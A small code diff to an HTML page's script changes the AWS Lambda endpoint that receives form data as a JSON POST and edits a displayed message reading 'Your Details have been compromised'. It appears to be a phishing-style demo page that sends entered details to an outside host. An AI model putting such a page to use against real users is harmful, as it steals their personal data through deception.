@@ -67,7 +67,7 @@
             document.getElementById("jsonOutput").innerText =
                 JSON.stringify(data, null, 4);
 
-            fetch("https://7veuh8bh18.execute-api.eu-west-1.amazonaws.com/default/amit-lambda-function", {
+            fetch("https://owz2p33xtk.execute-api.eu-west-1.amazonaws.com/default/amit-lambda-function", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify(data)
@@ -76,7 +76,7 @@
             .then(result => console.log(result));
             // Acknowledgment message
             document.getElementById("ackMessage").innerText =
-                " -- Your Details have been compromised -- ";
+                "-Your Details have been compromised-";
         }
     </script>
         
